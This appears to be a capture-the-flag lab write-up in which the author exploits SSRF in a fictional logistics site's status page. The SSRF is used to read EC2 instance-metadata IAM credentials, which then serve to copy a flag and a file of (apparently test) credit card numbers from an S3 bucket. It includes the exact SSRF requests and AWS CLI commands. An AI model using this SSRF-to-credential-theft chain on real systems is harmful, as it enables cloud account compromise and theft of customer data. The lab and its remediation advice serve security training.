https://app.pwnedlabs.io/labs/ssrf-to-pwned

### Scenario

Rumors are swirling on hacker forums about a potential breach at Huge Logistics. Your team has been monitoring these conversations closely, and Huge Logistics has asked you to assess the security of their website. Beyond the surface-level assessment, you're also to investigate links to their cloud infrastructure, mapping out any potential risk exposure. The question isn't just if they've been compromised, but how deep the rabbit hole goes.

### Information provided

```
http://app.huge-logistics.com
```

### Enumeration

When we open the website, we can see that it is mostly a static website with very little functionality.

![](./images/Pasted%20image%2020260720233045.png)

After reviewing the source code, we can see that one of the images used has been uploaded from a `S3` bucket in AWS.

![](./images/Pasted%20image%2020260720233134.png)

We can try to list the contents present in the `S3` bucket to check if there is anything worthwhile.

```
curl https://huge-logistics-storage.s3.amazonaws.com/
```

```
Output:-

<?xml version="1.0" encoding="UTF-8"?>
<ListBucketResult xmlns="http://s3.amazonaws.com/doc/2006-03-01/"><Name>huge-logistics-storage</Name><Prefix></Prefix><Marker></Marker><MaxKeys>1000</MaxKeys><IsTruncated>false</IsTruncated><Contents><Key>backup/</Key><LastModified>2023-05-31T22:14:05.000Z</LastModified><ETag>&quot;d41d8cd98f00b204e9800998ecf8427e&quot;</ETag><Size>0</Size><StorageClass>STANDARD</StorageClass></Contents><Contents><Key>backup/cc-export2.txt</Key><LastModified>2023-05-31T22:14:47.000Z</LastModified><ETag>&quot;6f0f13a016c5c9733112808e5a9c8ab4&quot;</ETag><Size>3717</Size><StorageClass>STANDARD</StorageClass></Contents><Contents><Key>backup/flag.txt</Key><LastModified>2023-06-01T14:38:27.000Z</LastModified><ETag>&quot;feec7290559778394ab236c72511442c&quot;</ETag><Size>32</Size><StorageClass>STANDARD</StorageClass></Contents><Contents><Key>web/</Key><LastModified>2023-05-31T20:40:47.000Z</LastModified><ETag>&quot;d41d8cd98f00b204e9800998ecf8427e&quot;</ETag><Size>0</Size><StorageClass>STANDARD</StorageClass></Contents><Contents><Key>web/images/about.jpg</Key><LastModified>2023-05-31T20:42:33.000Z</LastModified><ETag>&quot;049812ea2fa5472a46efa6690fbfc828&quot;</ETag><Size>114886</Size><StorageClass>STANDARD</StorageClass></Contents><Contents><Key>web/images/banner.jpg</Key><LastModified>2023-05-31T20:42:34.000Z</LastModified><ETag>&quot;a323e8a8031e252271d79623570d7f27&quot;</ETag><Size>271657</Size><StorageClass>STANDARD</StorageClass></Contents><Contents><Key>web/images/blog1.jpg</Key><LastModified>2023-05-31T20:42:35.000Z</LastModified><ETag>&quot;55a0833071afbf93d8e5f610c4da792a&quot;</ETag><Size>48441</Size><StorageClass>STANDARD</StorageClass></Contents><Contents><Key>web/images/blog2.jpg</Key><LastModified>2023-05-31T20:42:36.000Z</LastModified><ETag>&quot;d6daaa467634f7a1e143414980fd8e1a&quot;</ETag><Size>32805</Size><StorageClass>STANDARD</StorageClass></Contents><Contents><Key>web/images/blog3.jpg</Key><LastModified>2023-05-31T20:42:36.000Z</LastModified><ETag>&quot;3ea02607eb94dabe1215126ae2a9b4ce&quot;</ETag><Size>44570</Size><StorageClass>STANDARD</StorageClass></Contents><Contents><Key>web/images/executive.jpg</Key><LastModified>2023-05-31T20:42:37.000Z</LastModified><ETag>&quot;154192d9591f2b192f6c3763e83c65ce&quot;</ETag><Size>20032</Size><StorageClass>STANDARD</StorageClass></Contents><Contents><Key>web/images/manager.jpg</Key><LastModified>2023-05-31T20:42:37.000Z</LastModified><ETag>&quot;a261bec614bcd306f007ec5ed3f0d458&quot;</ETag><Size>13368</Size><StorageClass>STANDARD</StorageClass></Contents><Contents><Key>web/images/manager1.jpg</Key><LastModified>2023-05-31T20:42:38.000Z</LastModified><ETag>&quot;aeb365777f2f34dec72fdc3a5032edc6&quot;</ETag><Size>18260</Size><StorageClass>STANDARD</StorageClass></Contents><Contents><Key>web/images/signature.jpg</Key><LastModified>2023-05-31T20:42:38.000Z</LastModified><ETag>&quot;96cea2ea8187429d3b2d12e55ea556ef&quot;</ETag><Size>42216</Size><StorageClass>STANDARD</StorageClass></Contents></ListBucketResult>
```

![](./images/Pasted%20image%2020260720233942.png)

In this output we can see that there is a `flag.txt` file present! Our aim is to try and extract that file.

After checking more functionality of the website, we come across a tab which checks for the server status by sending a site as parameter in the GET request.

![](./images/Pasted%20image%2020260720234012.png)

If the request parameters are not sanitized properly by the backend servers, this is exploitable via SSRF attack.

### SSRF Exploit

Our final aim is to get `flag.txt` from the `S3` bucket. However, to get that, we will need a role or user who can access that particular file in the bucket.

There is a known vulnerability in `IDMSv1` of `EC2` instances which can be exploited using SSRF. We will hope that the same version is running on the EC2 instance where this website is hosted.

We will access the metadata of the EC2 instance using the link-local IP address endpoint.

```
GET /status/status.php?name=169.254.169.254/latest/meta-data
```

![](./images/Pasted%20image%2020260720234417.png)

This confirms that the website is vulnerable to SSRF!

We will now try to get the name of the role attached to this EC2 instance.

```
GET /status/status.php?name=169.254.169.254/latest/meta-data/iam/security-credentials
```

![](./images/Pasted%20image%2020260720234603.png)

We got the name of the role - `MetapwnedS3Access`

Now, we will try to get the access keys of this particular role.

```
GET /status/status.php?name=169.254.169.254/latest/meta-data/iam/security-credentials/MetapwnedS3Access
```

![](./images/Pasted%20image%2020260720234543.png)

We got the access keys! We can now login into the `aws cli` using these keys.

### S3 bucket data exfiltration

First, we will login to the aws cli using those keys.

```
aws configure
```

After logging in, we check our identity.

```
aws sts get-caller-identity
```

```
Output:-

{
    "UserId": "AROARQVIRZ4UCHIUOGHDS:i-0199bf97fb9d996f1",
    "Account": "104506445608",
    "Arn": "arn:aws:sts::104506445608:assumed-role/MetapwnedS3Access/i-0199bf97fb9d996f1"
}
```

It shows us the details of the role we have assumed.

Now, we will try some basic commands and hope they work.

```
aws iam list-attached-role-policies --role-name MetapwnedS3Access
```

```
Output:-

aws: [ERROR]: An error occurred (AccessDenied) when calling the ListAttachedRolePolicies operation: User: arn:aws:sts::104506445608:assumed-role/MetapwnedS3Access/i-0199bf97fb9d996f1 is not authorized to perform: iam:ListAttachedRolePolicies on resource: role MetapwnedS3Access because no identity-based policy allows the iam:ListAttachedRolePolicies action
```

```
aws s3 ls
```

```
Output:-

aws: [ERROR]: An error occurred (AccessDenied) when calling the ListBuckets operation: User: arn:aws:sts::104506445608:assumed-role/MetapwnedS3Access/i-0199bf97fb9d996f1 is not authorized to perform: s3:ListAllMyBuckets because no identity-based policy allows the s3:ListAllMyBuckets action
```

We could not access the list of all buckets or the policies attached to the assumed role because of lack of permissions.
We will next try to list the contents of the `S3` bucket we found.

```
aws s3 ls s3://huge-logistics-storage

                           PRE backup/
                           PRE web/
```

We will move the `backup` directory and get the sensitive information.

```
aws s3 ls s3://huge-logistics-storage/backup/

2023-06-01 03:44:05          0 
2023-06-01 03:44:47       3717 cc-export2.txt
2023-06-01 20:08:27         32 flag.txt
```

Credit card information:-

```
aws s3 cp s3://huge-logistics-storage/backup/cc-export2.txt -

VISA, 4929854977595222, 5/2028, 733
VISA, 4532044427558124, 7/2024, 111
VISA, 4539773096403690, 12/2028, 429
VISA, 4485480371143975, 4/2027, 744
VISA, 4556373594815152, 5/2024, 188
VISA, 4532459642763863, 10/2023, 808
VISA, 4838078625735408, 3/2024, 586
VISA, 4485222344412917, 3/2024, 399
VISA, 4024007149972688, 7/2027, 964
```

Finally the flag:-

```
aws s3 cp s3://huge-logistics-storage/backup/flag.txt -
<REDACTED>
```

### Recommendation for remediation

Make sure that all your EC2 instances are running on `IMDSv2` which is the default version nowadays.

